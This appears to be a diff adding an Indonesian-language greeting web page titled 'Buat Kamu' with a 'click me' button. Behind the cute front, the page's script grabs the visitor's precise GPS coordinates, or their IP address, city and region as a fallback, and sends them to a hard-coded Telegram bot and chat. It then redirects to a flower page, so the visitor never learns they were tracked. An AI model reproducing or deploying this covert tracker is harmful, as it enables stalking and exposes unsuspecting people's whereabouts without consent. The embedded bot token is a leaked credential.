@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Buat Kamu</title>
+</head>
+<body>
+    <div class="greetings">
+        <!-- Silahkan menambah kata sesuai keinginan dengan <span>text...</span -->
+        <span>A</span>
+        <span>L</span>
+        <span>L</span>
+        <span>O</span>
+        <span>W</span>
+    </div>
+    <div class="description">
+        <p><span></span></p>
+    </div>
+    <button id="sendData">
+        Coba Klik Akuu
+    </button>
+    <script>
+        document.getElementById('sendData').addEventListener('click', (event) => {
+            event.preventDefault(); // Mencegah navigasi langsung
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+
+                        // Buat link Google Maps
+                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                        // Format pesan untuk Telegram
+                        const message = `Informasi Lokasi GPS:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAkurasi: ${accuracy} meter\n\nLihat di Google Maps:\n${googleMapsLink}`;
+
+                        sendToTelegram(message, () => {
+                            // Arahkan ke halaman jika berhasil
+                            window.location.href = 'flower.html';
+                        });
+                    },
+                    (error) => {
+                        console.warn("Lokasi tidak bisa diperoleh: ", error.message);
+                        // Gunakan lokasi berbasis IP
+                        getIpLocation();
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                getIpLocation();
+            }
+        });
+
+        function getIpLocation() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const latitude = data.latitude;
+                    const longitude = data.longitude;
+                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    const message = `Lokasi Berdasarkan IP:\nKota: ${data.city}\nWilayah: ${data.region}\nNegara: ${data.country_name}\nIP: ${data.ip}\n\nLihat di Google Maps:\n${googleMapsLink}`;
+
+                    sendToTelegram(message, () => {
+                        // Arahkan ke halaman setelah alternatif berhasil
+                        window.location.href = 'flower.html';
+                    });
+                })
+                .catch(err => {
+                    console.error("Gagal mendapatkan lokasi IP:", err);
+                    window.location.href = 'flower.html';
+                });
+        }
+
+        function sendToTelegram(message, onSuccess) {
+            const botToken = '8103522113:AAECNtZDVMnPLaXX3HD1IFeQuOp7cQ2Td_Y'; // Ganti dengan token bot Anda
+            const chatId = '6813368909'; // Ganti dengan chat ID Anda
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(result => {
+                    console.log("Pesan berhasil dikirim:", result);
+                    onSuccess();
+                })
+                .catch(error => {
+                    console.error("Gagal mengirim pesan ke Telegram:", error);
+                    onSuccess(); // Tetap lanjutkan meskipun gagal
+                });
+        }
+    </script>
+</body>
+</html>
